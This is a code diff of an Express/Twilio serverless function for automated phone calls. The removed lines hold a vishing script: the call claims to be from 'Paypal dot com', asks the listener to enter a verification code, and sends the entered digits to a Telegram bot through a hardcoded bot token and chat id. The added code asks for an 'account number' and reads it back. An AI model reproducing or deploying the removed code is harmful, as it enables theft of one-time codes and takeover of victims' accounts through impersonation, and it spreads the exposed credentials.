@@ -5,29 +5,28 @@ const app = express();
 const router = express.Router();
 const axios = require('axios');
 
-router.get("/", (req, res) => {
-  res.json({
-    hello: "hi!"
-  });
+router.get("/res", (req, res) => {
+  if(!req.body.Digits) return res.json({msg: "Digits not found"})
+  const response = new VoiceResponse();
+  response.say('You entered '+req.body.Digits);
+  res.type('text/xml');
+  res.send(response.toString());
+
 });
 
 router.get('/voice',(req,res) => {
-  const twiml = new VoiceResponse();
-
-  const gather = twiml.gather({ numDigits: 8 });
-  gather.say('This call is from Paypal dot com. \nWe have sent you a 6 to 8 digits verification code to this number. \nPress the number now to verify');
-
-  twiml.redirect('/voice');
-
+  const response = new VoiceResponse();
+  const gather = response.gather({
+      action: '/res',
+      method: 'GET',
+      numDigits: 6
+  });
+  gather.say('Please enter your account number,\nfollowed by the pound sign');
+  response.say('We didn\'t receive any input. Goodbye!');
   res.type('text/xml');
-  res.send(twiml.toString());
-  if (req.body.Digits) {
-    axios.get('https://api.telegram.org/bot5403778586:AAHLpzXNK3Qyk49NCGqUlrxcf8drC3Gdi9U/sendMessage?chat_id=5266183529&text=Hi+'+req.body.Digits, (err, res)=>{
-      if(err){
-        console.log("err")
-      }
-    })
-  }
+  res.send(response.toString());
+  console.log(response.toString());
+
 
 })
 app.use(`/.netlify/functions/api`, router);
